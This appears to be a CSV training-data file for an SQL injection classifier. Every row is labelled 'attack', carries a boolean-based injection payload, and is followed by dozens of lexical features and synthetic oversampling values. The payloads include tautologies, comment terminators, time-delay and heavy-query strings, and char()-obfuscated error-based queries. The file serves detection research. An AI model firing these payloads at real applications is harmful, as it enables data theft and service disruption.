id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.3793327378353081,34.442146907328635,14.778926546335677,2.928699091081641,3.0,9.0,16.44214690732864,6.0,0.08720863721208519,0.2616259116362556,0.47674817672748887,0.17441727442417038,1.0,0.0,1.7789265463356774,0.0,0.0,0.9999999999999999,0.0,2.1105367268321604,0.1105367268321614,0.0,0.0,2.778926546335677,1.0,0.0,0.8894632731678387,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000012,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,0.285029694972474,71.5840479545974,25.750126109634834,3.772349809247504,13.916708703211611,23.666834812846446,23.50025221926967,10.500252219269669,0.19514262817272116,0.3311305749577918,0.32815588578677796,0.14557091108270903,0.0,1.0,2.8334174064232234,0.0,0.0,2.0,0.0,2.833417406423223,0.0,0.9167087032116117,0.9167087032116116,4.833417406423223,0.0,1.0,0.9167087032116117,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.5218730944163626,119.06797509016859,29.32543800721349,4.09704310399754,66.6035040577079,7.349123985573026,32.301752028853954,12.813595018033718,0.5589473640289204,0.0628947489204689,0.27103069910080607,0.10712718794980462,0.0,1.3254380072134873,0.0,0.0,1.0,0.9999999999999999,0.0,4.162719003606743,0.0,0.0,2.1627190036067434,2.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.16271900360674374,0.8372809963932564,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,0.9024974204380256,234.25492529350055,31.0,3.7391267756737587,51.35389525393611,65.91254896729939,89.82373422688755,27.164746845377508,0.23049443069867212,0.2732803174217211,0.3800879783151634,0.1161372735644434,0.0,1.1518642099313618,0.0,0.0,1.924067895034319,0.9999999999999999,0.0,17.012882635446147,0.0,0.0,5.772203685102957,2.924067895034319,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.9240678950343191,0.0,3.7722036851029572,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9240678950343191,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.696271580137276
SMOTE_000015,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.4365902882505227,224.4154795985207,36.873843440042265,3.84475468657963,68.89234839936601,31.621530320126794,88.64003527945054,35.261565599577345,0.3066930394787814,0.14145171699242837,0.39503852114808946,0.15681672238070074,2.252313119915469,0.0,0.0,0.0,0.0,2.0,0.0,18.50462623983094,0.0,1.1261565599577346,3.1261565599577343,10.252313119915469,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.8738434400422654,0.0,0.8738434400422654,0.0,0.12615655995773456,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.252313119915469,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.126156559957735
SMOTE_000016,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,0.07936893911339396,92.64682559771889,29.985299418233662,3.742332272969521,24.23520930826141,16.0,38.205808144728735,14.205808144728737,0.2613583313630752,0.17308590077018043,0.4125923095110075,0.15296345835573685,0.0,4.0,0.9852994182336616,0.0,0.0,1.0147005817663384,0.0,6.0588023270653535,0.029401163532676855,1.0147005817663384,1.0,2.0882034905980307,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.014700581766338316,0.0,0.0,0.0,0.0,1.0147005817663384,0.9852994182336616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,2.451531265741509,42.953216831088326,17.869674342087425,3.4543589505461334,10.213868146913477,14.246449561391618,13.869674342087428,4.623224780695811,0.2185615567681859,0.3575909452254886,0.31788562350474414,0.10596187450158137,0.0,1.0,1.3116123903479042,0.0,0.0,1.6558061951739522,0.0,0.6558061951739518,0.0,0.0,0.0,2.9674185855218562,0.0,1.0,0.6558061951739521,0.0,3.469446951953614e-18,1.0,0.6558061951739521,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.6558061951739521,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6558061951739522
SMOTE_000018,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.571203612016352,36.168618870596305,13.91569056470184,2.7681487996442296,3.0,9.0,18.16861887059632,6.0,0.0831998013840643,0.24959940415219278,0.5008011916956143,0.16639960276812854,1.0,0.0,0.9156905647018395,0.0,0.0,0.9999999999999999,0.0,2.5421547176490797,0.5421547176490802,0.0,0.0,1.9156905647018396,1.0,0.0,0.4578452823509198,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000019,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.8291502091479075,390.5554880948657,31.0,3.287835460400844,98.99939285379165,51.889630956476864,185.0,54.666464284597225,0.2534693903341948,0.13287912494933285,0.4736850593642195,0.13996642535225282,2.221952379462958,0.0,0.4445119051342603,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.44451190513426,0.5554880948657396,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.5554880948657397,0.4445119051342604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000020,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.4050955718481153,191.84357522011,30.235898372896127,3.7332379921773446,103.2756351693992,11.073076220327904,56.3487113897271,21.146152440655808,0.5418595429660937,0.057962918026905036,0.28960035986912014,0.11057717913788115,4.0,0.0,0.0,0.0,1.0,1.691025406775968,0.0,6.764101627103872,1.3820508135519356,0.0,5.073076220327903,2.6910254067759682,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000021,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.112084875783181,39.32139540067729,12.339302299661352,2.588022049933403,2.339302299661348,10.98209310101595,20.0,6.0,0.05982190867440751,0.27857038107402,0.5089290078858251,0.1526787023657475,1.0,0.0,0.6606977003386497,0.0,0.0,0.9999999999999999,0.0,3.0,0.3393022996613502,0.0,0.0,1.6606977003386492,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.3393022996613502,0.6606977003386499,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000022,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.4856876954631069,38.0,13.391245343383819,2.633979058773327,3.0,9.0,20.0,6.0,0.07894736842105263,0.23684210526315788,0.5263157894736842,0.15789473684210525,0.6087546566161811,0.0,0.7824906867676378,0.0,0.0,0.9999999999999999,0.0,3.0,0.6087546566161811,0.0,0.0,1.7824906867676376,0.6087546566161811,0.0,0.391245343383819,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000023,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.1591177770187386,121.07778501515153,34.37381107467533,3.79312991551718,36.3519869702381,18.165081432900436,49.165081432900436,17.395635179112553,0.29909284889600407,0.14835258118522893,0.40754814538353606,0.14500642453523088,3.0,0.0,2.0,1.0,0.0,1.3956351791125545,0.0,9.0,0.0,0.0,1.0,4.3956351791125545,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.39563517911255464,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.395635179112555
SMOTE_000024,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.8474367342046111,59.02657088219624,23.648550903327767,3.772119430358127,13.43236726888518,20.21618363444259,19.297101806655533,6.080918172212947,0.22828243509923948,0.34478950660328056,0.32606107788091265,0.1008669804165673,0.0,1.0,1.2161836344425896,0.0,0.0,2.0,0.0,1.4323672688851783,0.0,0.21618363444258948,0.2161836344425896,3.2161836344425896,0.0,1.0,0.2161836344425895,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.21618363444258953,0.7838163655574105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.20800490051890122,144.34334110628737,33.0,4.159838359589402,76.0,16.0,37.27467288502989,15.068668221257473,0.5265616180053208,0.11085507747480436,0.2581958088418937,0.10438749567798125,0.06866822125747252,0.9313317787425275,2.0,0.0,1.0,2.0,0.0,4.068668221257473,0.0,0.0,2.0,5.0,0.06866822125747252,0.9313317787425275,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000026,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.384677041963956,228.36104865689623,35.43300286217037,3.7855974828146937,66.07568479374565,35.95533524144691,89.5533524144691,36.77667620723455,0.2883094948958291,0.15892448454947716,0.39215686274509803,0.16060915780959573,0.0,0.5223323792765449,2.0,0.0,0.0,2.0,0.0,19.388338103617276,0.0,1.4776676207234551,3.477667620723455,11.91067048289382,0.0,0.5223323792765449,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.95533524144691,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.95533524144691
